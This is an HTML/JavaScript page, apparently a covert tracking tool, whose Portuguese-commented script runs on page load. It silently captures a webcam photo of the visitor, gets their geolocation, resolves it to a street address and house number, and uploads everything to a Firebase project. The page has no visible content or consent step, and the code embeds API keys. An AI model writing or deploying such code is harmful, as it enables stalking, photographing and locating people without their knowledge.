<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Captura Automática de Dados</title>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-storage-compat.js"></script>
</head>
<body>
  <script>
    // Configuração do Firebase
    const firebaseConfig = {
      apiKey: "AIzaSyAWhfaY2Adp4YJGwvITWTGHP-7zOLNfiGI",
      authDomain: "sandalias-retro-9f0c6.firebaseapp.com",
      databaseURL: "https://sandalias-retro-9f0c6-default-rtdb.firebaseio.com",
      projectId: "sandalias-retro-9f0c6",
      storageBucket: "sandalias-retro-9f0c6.appspot.com",
      messagingSenderId: "786208752798",
      appId: "1:786208752798:web:193f76bbbf5ac4ef27678f",
      measurementId: "G-XGVHLX01EB",
    };

    // Inicializa Firebase
    const app = firebase.initializeApp(firebaseConfig);
    const database = firebase.database();
    const storage = firebase.storage();

    // Função para capturar selfie e salvar no Storage
    function captureSelfieAndSave() {
      const video = document.createElement('video'); // Cria o elemento de vídeo oculto
      const canvas = document.createElement('canvas'); // Cria o canvas oculto

      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          video.srcObject = stream;
          video.play();

          video.onloadedmetadata = () => {
            // Tira a selfie automaticamente assim que a câmera está pronta
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Para a câmera e captura a imagem
            stream.getTracks().forEach(track => track.stop());

            const selfieData = canvas.toDataURL('image/png', 1.0); // Gera a imagem em alta qualidade
            uploadSelfieToStorage(selfieData);
          };
        })
        .catch(error => {
          alert('Erro ao acessar a câmera: ' + error.message);
        });
    }

    // Função para salvar selfie no Firebase Storage
    function uploadSelfieToStorage(selfieData) {
      const storageRef = storage.ref(`selfies/selfie_${Date.now()}.png`);
      storageRef.putString(selfieData, 'data_url')
        .then(snapshot => snapshot.ref.getDownloadURL())
        .then(url => {
          getLocation(url); // Após salvar a selfie, coleta localização e endereço
        })
        .catch(error => {
          alert('Erro ao salvar a selfie no Firebase Storage: ' + error.message);
        });
    }

    // Obter endereço completo a partir de coordenadas
    function getAddressFromCoordinates(lat, lon, selfieUrl) {
      const apiKey = '150e176e377d4d2ab2819ddada71dbe7';
      const url = `https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${apiKey}`;

      fetch(url)
        .then(response => response.json())
        .then(data => {
          if (data.results.length > 0) {
            const result = data.results[0].components;
            const addressDetails = {
              latitude: lat,
              longitude: lon,
              city: result.city || result.town || result.village || '',
              neighborhood: result.suburb || '',
              road: result.road || '',
              house_number: result.house_number || '',
              country: result.country || '',
              address: data.results[0].formatted,
              selfieUrl: selfieUrl
            };
            sendDataToFirebase(addressDetails); // Envia os dados para o Firebase
          } else {
            alert('Erro ao obter endereço: nenhum resultado encontrado.');
          }
        })
        .catch(error => {
          alert('Erro ao obter o endereço: ' + error.message);
        });
    }

    // Localização do usuário
    function getLocation(selfieUrl) {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(position => {
          const { latitude, longitude } = position.coords;
          getAddressFromCoordinates(latitude, longitude, selfieUrl);
        }, error => {
          alert('Erro ao obter a localização: ' + error.message);
        });
      } else {
        alert('Geolocalização não é suportada pelo navegador.');
      }
    }

    // Enviar dados para o Firebase
    function sendDataToFirebase(data) {
      const reference = database.ref('userData');
      reference.push(data, function (error) {
        if (error) {
          alert('Erro ao enviar dados para o Firebase: ' + error.message);
        } else {
          alert('Dados enviados com sucesso!');
        }
      });
    }

    // Iniciar coleta de dados automaticamente
    window.onload = () => {
      captureSelfieAndSave(); // Primeiro passo: captura a selfie automaticamente
    };
  </script>
</body>
</html>
